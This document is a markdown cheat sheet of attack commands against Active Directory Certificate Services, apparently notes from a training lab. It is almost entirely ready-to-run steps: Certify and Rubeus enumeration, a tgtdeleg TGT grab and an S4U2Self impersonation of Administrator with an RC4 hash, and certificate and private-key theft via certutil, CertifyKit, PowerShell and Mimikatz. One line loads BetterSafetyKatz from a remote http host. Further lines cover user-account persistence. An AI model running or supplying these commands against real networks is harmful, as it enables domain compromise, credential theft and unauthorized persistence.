# Look for AD CS containers using the AD Module

```powershell
Get-ADObject -Filter * -SearchBase '<CA authorities>'
ls 'AD:\<CA authoririty>'
```

## Based on ObjectClass

```powershell
Get-ADObject -LDAPFilter '(objectclass=certificationAuthority)' -SearchBase 'corp name' | fl *
```

## Enumerate CA

```powershell
Certify.exe cas
```

## Find Templates

```powershell
Certify.exe find
```

## CertPotato Vulnerability

### Perform tgtdeleg Attack to get a TGT

```powershell
Rubeus.exe tgtdeleg /nowrap
```

### Perform S4U2Self Attack to gain CIFS admin access

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/cb-webapp1.certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /user:'cb-webapp1$' /rc4:B2FCBA1C3570AB9418994799B9BC985A /ptt
```

## ADCS enumeration using ADMODULE

```powershell
Import-Module C:\ADCS\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll 
Import-Module C:\ADCS\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
Get-ADDomain | ft DNSRoot, ParentDomain, InfrastructureMaster 
```

### Enumerate the Certification Authorities Container

```powershell
Get-ADObject -Filter * -SearchBase 'certificate container name'
```

ls 'AD:\CA authority container' | fl

Get-ADObject -LDAPFilter '(objectclass=certificationAuthority)' -SearchBase 'CA name' | fl * 

Use rubues for authenticating using ptt

Rubeus.exe ptt /ticket:<ticket>

### Enumerating the CertStore using CertUtil 

 certutil -store My
 certutil -user -store My

### Enumerating the CertStore using CertifyKit 

 CertifyKit.exe list
 CertifyKit.exe list /storename:my /storelocation:localmachine

### Enumerating the CertStore using PowerShell 

 Get-ChildItem Cert:\CurrentUser\ -Recurse
 Get-ChildItem Cert:\LocalMachine\ -Recurse  
 Get-ChildItem Cert:\LocalMachine\My -Recurse

### Exporting Certificates using CertUtil (THEFT1) 
 certutil -p "Passw0rd!" -exportpfx <serial number of the cert> C:\Users\Public\cert.pfx 

 ### Exporting Certificates using CertifyKit (THEFT1) 
 C:\Users\Public\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:<thumbprintofcert> /outfile:C:\Users\Public\cert_certifykit.pfx

### Exporting Certificates using Mimikatz (THEFT1) 
 C:\Users\Public\Loader.exe -path http://<ipaddress>/BetterSafetyKatz.exe -args "crypto::capi" "privilege::debug" "crypto::certificates /systemstore:local_machine /store:my /export" "exit"
 crypto::capi
 privilege::debug
 crypto::certificates /systemstore:local_machine /store:my /export 

### Exporting Certificates using PowerShell (THEFT1) 
 Export-PfxCertificate -Cert Cert:\LocalMachine\My\93B4027A4CD6A67A175E796E5DF8B673ACD2D75D -FilePath C:\Users\Public\studentadmin_psh.pfx -Password $mypwd

### Certifcate Exfiltration

Sharpshare.exe - tool for domain share enumeration

### User account persistence (PERSIST1) 
  runas /netonly /user:certbulk\<accountname> "%LocalAppData%\Microsoft\WindowsApps\wt.exe"

  Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:User /user:<accountname>

### Shadow credentials

Whisker (https://github.com/eladshamir/Whisker) aids red teams to abuse Shadow Credentials using the msDS-KeyCredentialLink attribute in red team operations.